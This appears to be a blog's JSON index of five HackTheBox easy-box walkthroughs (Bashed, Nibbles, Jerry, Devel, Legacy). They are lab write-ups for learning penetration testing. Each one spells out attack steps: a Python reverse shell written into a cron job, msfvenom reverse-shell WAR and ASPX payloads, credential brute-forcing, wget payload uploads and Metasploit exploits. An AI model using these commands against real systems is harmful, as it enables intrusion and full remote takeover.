[ { "title": "HackTheBox - Bashed", "url": "/posts/bashed/", "categories": "HTB, easy", "tags": "hackthebox, easy", "date": "2021-10-19 13:00:00 +0100", "snippet": "As always we start with our nmap scan.nmap -T4 -p- -A 10.10.10.68-T4 specifies the speed at which we run the scan, the -p- option scans all 65535 ports, and the -A enables OS detection, version detection, script scanning, and traceroute.Just the one port is open. Port 80 (http). And the Apache version is returned - Apache httpd 2.4.18Let’s go check out the website at “http://10.10.10.68”. We se an Arrexel development site for a web based terminal.After a bit of enumeration of the site, there isn’t much to be found. So we’re going do some directory busting using gobuster.gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x .phpSo with the results gobuster returns, we go through each directory looking for something interesting. The /dev folder looks promising as that directory hosts the web shell. We might be able to do something with that.After selecting phpbash.php we are taken to the web terminal. From here we can navigate to the root folder, then home and into the user folder. From here we cat user.txt and get ourselves the user flag.We list user privileges sudo -l and see we can switch into a user called scriptmanager without a password. we cd ../scriptmanager and sudo su scriptmanager to switch user, but we get a message saying no tty present. We need that command to be able to print terminal related info. Example:- sudo command is trying to execute a command that requires a password but sudo does not have access to a tty to prompt the user for a passphrase.So we won’t be able to proceed any further in this shell, but we can upload a reverse shell that we’ll use to gain access.In a browser navigate to “https://pentestmonkey.net/tools/web-shells/php-reverse-shell” and open the tar.gz file. Then open the “php-reverse-shell.php” file, and copy the contents.From the terminal gedit shell.php and paste the copied code into the file. Navigate to lines 49 &amp;amp; 50 and change the IP to your tun0 address. You can leave the port number.In a new terminal window start an http server python3 -m http.server 80.Next step is to navigate back to the the web shell and into the uploads folder cd /var/www/html/uploads. Then wget http://10.10.16.2/shell.php (replacing the ip with your tun0 address). ls to confirm the reverse shell has been uploaded.Return to the terminal and start a listener with netcat nc -nvlp 1234. Make sure to use the same port number as is in the reverse shell. Then head back to the browser and trigger the shell by navigating to “http://10.10.10.68/uploads/shell.php”.We see in our terminal that we have ourselves a shell.We see we still don’t have tty. We want to spawn one. In a browser navigate to “https://netsec.ws/?p=337”. We’ll go through the list of commands until we find one that works.For me the first command worked. Make sure however to change &quot;/bin/sh&quot; to &quot;/bin/bash&quot; as we want to get a bash shell - python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;. You can see from the $ sign we’ve got tty. We try to swith user with sudo su scriptmanager but it doesn’t work and does actually expect a password. A worksround here is sudo -u scriptmanager /bin/bash. We are now scriptmanager.We pwd and see we’re in the root folder. We ls -la to see what users have access to directories and files. Straight away the scriptmanager scripts folder stands out.Switch into the scripts folder, and type ls -la to see permissions. We cat test.py and see the file is writing to the test.txt file. From the current time and the timestamp on the test.txt file it looks as though the .py file is a scheduled task. You can ls -la again to confirm it’s a chron job. We can overwrite the python file with a malicious one and get it to execute.Back to a browser head to “https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet” and copy the python script. In a terminal gedit test.py and copy the script into the file. Remove python -c and the quotes. Alter the IP to your tun0 IP, and change the port number as we already used 1234, change &quot;/bin/sh&quot; to &quot;/bin/bash&quot; and save.import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&amp;lt;IP-HERE&amp;gt;&quot;,2345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);In out terminal we need to start a listener for the reverse shell to talk back to nc -nvlp 2345.Then in our shell remove the test.py file as we’re replacing it with the one we just created. Then wget http://10.10.16.2/test.py to upload the malicious file.Now that’s uploaded we just have to wait for the chron job to trigger again. Once it does we can look at our terminal and see we have root privileges with whoami. The system has been owned!All that’s left to do is to navigate to the root directory cd ../root, and collect our flag cat root.txt to fully pwn the system!" }, { "title": "HackTheBox - Nibbles", "url": "/posts/nibbles/", "categories": "HTB, easy", "tags": "hackthebox, easy", "date": "2021-10-12 13:00:00 +0100", "snippet": "First we run an nmap scan - nmap -T4 -p- -A 10.10.10.75. -T4 specifies the speed at which we run the scan, the -p- option scans all 65535 ports, and the -A enables OS detection, version detection, script scanning, and traceroute.We see two ports open, 22(ssh) and port 80(http). We also get some information disclosure - Apache httpd 2.4.18.We navigate to “http://10.10.10.75/” in a browser. We see a web page with “Hello world!”. We take a look at the page source and see a comment pointing to a directory &amp;lt;!-- /nibbleblog/ directory. Nothing interesting here! --&amp;gt;We navigate to “http://10.10.10.75/nibbleblog/” in the url and see a nibbleblog website.We are going to see if we can find an exploit for nibbles with Searchsploit. We run searchsploit nibble in a terminal which returns two results. The remote code execution exploit looks promising.Arbitrary File Upload (Metasploit) | php/remote/38489.rbWe fire up Metasploit and search for the exploit we saw with Searchsploit. There’s only one result and this is the one we want to run - use exploit/multi/http/nibbleblog_file_uploadWe run info and get a description of the exploit -Description: Nibbleblog contains a flaw that allows an authenticated remote attacker to execute arbitrary PHP code. This module was tested on version 4.0.3.This means that for the exploit to work you need to be an authenticated user. So we need to locate the admin login panel and gain access. Let’s run a directory buster with gobuster - dir -u http://10.10.10.75/nibbleblog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x .php to locate the admin login page.From gobuster we see a directory called /admin.php. That’s the login page we want to navigate to - “http://10.10.10.75/nibbleblog/admin.php”. Login with these credentials - admin: nibblesFrom inside the admin panel, we select “Settings”. Scrolling down to the bottom of the page we see a nibbles version - Nibbleblog 4.0.3 “Coffee”. This is a find, this means the exploit we found is suitable for this version of nibble.Back in msfconsole we set the options of the exploit we chose. set password nibbles , set username admin , set RHOSTS 10.10.10.75 , set TARGETURI /nibbleblog , be sure to set LHOST 10.10.16.5, andrun the exploit.We’ve got ourselves a shell, however we getuid and see we’re a low level user. We’re going to need to perform some privilege escalation. But whilst we’re here we cd /home/nibbler and cat user.txt to get our user flag.From here we switch to a shell session. And type sudo -l. The output shows us how we can run commands as su. We cd /home/nibbler then mkdir personal then cd personal then mkdir stuff and cd stuff.Now we echo &quot;bash -i&quot; &amp;gt; monitor.sh.To run the bash file we need to change it’s permissions with chmod +x monitor.sh. Then we run sudo ./monitor.sh.And like that, we have root! The machine has been owned.To fully own the system cd .../.../.../.../root and cat root.txt to find the flag and fully own it!" }, { "title": "HackTheBox - Jerry", "url": "/posts/jerry/", "categories": "HTB, easy", "tags": "hackthebox, easy", "date": "2021-10-07 13:00:00 +0100", "snippet": "Our first step is to run nmap. Only port 8080 is open. The alternative to port 80. There’s some information disclosure as some service information is included.We navigate to “http://10.10.10.95:8080/” and find a default web page. I wonder if we can gain access to the web server with default credentials?We search Google for “tomcat default credentials”. THe first result is “https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown”. We will use this list to bruteforce our way in. There are tools to automate this process but we’re going to it manually.Copy all the default creds into a text file. I’m using Mousepad. Use Find and Replace to search for the space (“ “), replace it with a colon, then select replace all and hit save. I saved mine as tomcat.txtNow in your browser, go to Preferences &amp;gt; Settings (bottom of pages). In connection settings select manual proxy. CHange the proxy to 127.0.0.1 and Port to 8080. Select “Also use this proxy for FTP and HTTPS”. And press okay.Fire up Burp Suite, select “Temporary project” and “Next” &amp;gt; “Use Burp defaults” and select “Start Burp”.We’re going to write a bash script that we’ll use to bruteforce our way into the web server.for cred in $(cat tomcat.txt); do echo -n $cred | base64; doneThis is going iterate through each line in the .txt file, convert it into base64 and print it out. Copy the base64 list.Next we return to the Apache Tomcat page and select “Manager App”. Nothing happens because Burp has intercepted the request. So we navigate to Burp suite, look for the Proxy tab and “Forward” the request.We go back to the Apache web page and select “OK” in the pop up, without entering any credentials. Back in burpe, under the proxy tab we right click on the request in the raw text area and select “Send to Intruder”.Navigate to the “Intruder” tab, then to “Positions”. We highlight our payload paramater area and select the “Add” button. The highlighted area is what we will be replacing with our base64 list.Now select the payloads tab, and under “Payload Options”, paste the base64 list we copied. Make sure to deselect the “URL-encode these characters” option. Select “Start Attack”.Search for the the result with the “200” status code. Those are the correct credentials. To decode it, select the correct payload and below where it shows the request, highlight the base64 string. Right click and select “Send to Decoder”. Go to the decoder and select decode as bas64. The output should be “tomcat:s3cret”.We can now set our browser proxy settings back to system proxy settings.Now that we have access to the web server, we want to upload a malicious file. The malicious file will be a reverse shell that we’re going to generate using msfvenom.The payload we want can be found here “https://mytrickstuff.com/hacks-and-tricks/msfvenom-cheat-sheet-one-page-one-code/”.msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war &amp;gt; shell.warWe can paste the snippet into the terminal. Adding your tun0 IP as your LHOST, and assigning LPORT to 4444. msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.6 LPORT=4444 -f war &amp;gt; shell.war. Then we start a listener on the same port for our reverse shell to connect to with nc -nvlp 444.In the Apache mamager scroll down to where you see “War file to deploy”. Browse and select the WAR file we just generated and select “Deploy”. It should now be deployed under Applications in the manager dashboard.Select “/shell” under applications. This initiates the shell and talks back to our listener.We return to our terminal and see we have a shell. We run whoami and see we have authority\\system. Congratulations, you have owned this box!Now locate the flags to fully own this system." }, { "title": "HackTheBox - Devel", "url": "/posts/devel/", "categories": "HTB, easy", "tags": "hackthebox, easy", "date": "2021-10-05 13:00:00 +0100", "snippet": "Firstly we begin with our NMAP scan. From our scan results we see that ports 21 (ftp) &amp;amp; 80 (http) are open. My first obvservation is that anonymous login is permitted on the FTP server.Before attempting to connect to FTP, I’d like to take a look at what the web server on port 80 is serving up so in a browser I navigate to “http://10.10.10.5”.We see a default webpage for IIS Microsoft webserver. To save time I’ll skip the step of running Dirbuster, which I would normally do at this point to see if I could bruteforce any hidden directories.As the FTP server allows for anonymous login, I test it to see if we can get access. The anonymous login is successfull. We’ll be using it to upload a malicious file. The malicious file will be a reverse shell that we’ll be connecting to via Metasploit.The snippet we need to generate our malicious file can be found here “https://mytrickstuff.com/hacks-and-tricks/msfvenom-cheat-sheet-one-page-one-code/”. As we’re dealing with a Microsoft webserver we need to locate the payload for the file type of ASP. msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp &amp;gt; shell.asp.Enter the snippet for msfvenom to build the file. Add your tun0 IP to LHOST. I changed the file extension to ASPX, but either ASP or ASPX will work.Make sure the file extension in the command and the extension of the file your putting it in are the same. This will take a few seconds to generate. msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.4 LPORT=4444 -f aspx &amp;gt; ex.aspx.We fire up Metasploit using msfconsole and enter use exploit/multi/handler to begin opening up a listener. This is what our malicious file will connect back to once we have uploaded it to the FTP server and triggered it via a browser.We need to reconfigure the options. This requires setting the payload to the same as we used for the malicious reverse shell file we generated with msfvenom. We also need to set the LHOST to the same IP as we used, which is the IP of our tun0 network interface. We enter run to start the listener.Now we need to upload our malicious file. We connect to the FTP server with ftp 10.10.10.5And upload our file to the server with put ex.aspx. You can use the ls command to list out the files on the FTP server to confirm the ex.apsx has uploaded.To execute the file we navigate to the url of the web server and append the file name http://10.10.10.5/ex.aspx. This triggers the reverse shell. We return back to the listener session and see wee have a meterpreter session. However after typing getuid we see we have low level privilges. We need to escalate our privileges.For the moment we background the session.In Metasploit we search suggester for a post module that will escalate our privileges. It returns one post exploit module.We use post/multi/recon/local_exploit_suggester. Then set the options. We only need to specify the session that we want, that’s the session of the reverse shell we have with the FTP server. You can find the session number from when we ran background.The suggester returns some possible exploits. In this instance we want to use the kitrap0d exploit. We use exploit/windows/local/ms10_015_kitrap0dWe look at the options.We set session 2, set LHOST 10.10.16.3, and set LPORT 4445. Be sure to use your tun0 IP, as the exploit will have defaulted to your eth0 address. And as we’re already using port 4445, we want to use another port.We run the exploit, type getuid, and see we now have AUTHORITY/SYSTEM. This system has been owned!With search -f user.txt.txt and search -f root.txt you can locate the flags to fully own the system :)" }, { "title": "HackTheBox - Legacy", "url": "/posts/legacy/", "categories": "HTB, easy", "tags": "hackthebox, easy", "date": "2021-10-05 13:00:00 +0100", "snippet": "With the victim IP already in hand we begin the process by running a network mapping tool called NMAP. The command I like to use is nmap -T4 -p- -A 10.10.10.4-T4 specifies the speed at which we run the scan, the -p- option scans all 65535 ports, and the -A enables OS detection, version detection, script scanning, and traceroute.The scan returns 3 ports. Port 3389 is the designated port for the Remote Desktop Protocol. As the port is closed we won’t be attacking it, however ports 139 &amp;amp; 445 are open. These both pertain to the SMB File sharing protocol.As our NMAP scan didn’t return an SMB version we fire up Metasploit using the msfconsole command. In Metasploit we search smb_version for a module that will allow us to ascertain the version. We then use the module with this command use auxiliaryscanner/smb/smb_version. With the SMB version we’ll be better equipped to find a suitable exploit.We run options to see what we need to configure. The THREADS option has already been set, so we just need to assign the RHOSTS option with the IP of the victim machine. We set it with this command set RHOSTS 10.10.10.4.We run the module which returns the SMB version - Windows XP SP3.With this information we go to a browser and search for “smb Windows XP SP3 exploit”. Typically the two resources we want to go for are “www.exploit-db.com” &amp;amp; “www.rapid7.com”.One of the top results should be “www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi/”. This will contain a suitable exploit for us to attack with, and contains the steps and options in order for us to carry out the exploit.We return to our terminal and follow the steps outlined on Rapid7. In Metasploit we enter use exploit/windows/smb/ms08_067_netapi No payload had been configured so the payload defaults to windows/meterpreter/reverse_tcp.We then take a look at our options for the exploit. We see that all we are required to set is RHOSTS. As we’re attempting this via HackTheBox’s VPN config, our LHOST is set using the wrong network interface IP. We need to change it to the tun0 IP that is our network interface into HTB.We use ip a in a new terminal window to find our tun0 IP and enter set RHOSTS 10.10.10.4 and (in my case) set LHOST 10.10.16.3.At this stage we’re ready run our exploit, we can do this with either the run or exploit command. And as simple as that we have ourselves a reverse shell. From here we want to know what user level we are, so we run getuid and see that we are AUTHORITY/SYSTEM.We have the highest level of privileges, the system has been owned!Navigate to ‘Document and Settings\\Users\\john\\Desktop\\user.txt’ and ‘Document and Settings\\Users\\Administrator\\Desktop\\root.txt’ to locate your flags and fully own the system." } ]
